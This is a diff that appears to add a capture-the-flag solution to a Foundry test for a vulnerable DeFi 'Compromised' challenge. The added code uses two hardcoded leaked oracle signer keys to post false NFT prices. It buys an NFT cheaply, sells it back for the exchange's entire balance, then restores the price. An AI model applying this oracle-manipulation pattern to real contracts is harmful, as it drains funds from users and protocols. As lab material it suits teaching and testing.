@@ -74,8 +74,43 @@ contract Compromised is Test {
         console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
     }
 
+    function _changeOraclePrices(
+        address oracle1,
+        address oracle2,
+        uint256 price
+    ) private {
+        vm.prank(oracle1, address(this));
+        trustfulOracle.postPrice("DVNFT", price);
+        vm.prank(oracle2, address(this));
+        trustfulOracle.postPrice("DVNFT", price);
+    }
+
     function testExploit() public {
         /** EXPLOIT START **/
+        bytes32 compromisedKey1 = 0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9;
+        bytes32 compromisedKey2 = 0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48;
+        address compromisedAddr1 = vm.addr(uint256(compromisedKey1));
+        address compromisedAddr2 = vm.addr(uint256(compromisedKey2));
+        _changeOraclePrices(compromisedAddr1, compromisedAddr2, 0.1 ether);
+
+        vm.prank(attacker, address(this));
+        uint256 tokenId = exchange.buyOne{value: 0.1 ether}();
+
+        _changeOraclePrices(
+            compromisedAddr1,
+            compromisedAddr2,
+            address(exchange).balance
+        );
+
+        vm.startPrank(attacker);
+        damnValuableNFT.approve(address(exchange), tokenId);
+        exchange.sellOne(tokenId);
+        vm.stopPrank();
+        _changeOraclePrices(
+            compromisedAddr1,
+            compromisedAddr2,
+            INITIAL_NFT_PRICE
+        );
 
         /** EXPLOIT END **/
         validation();
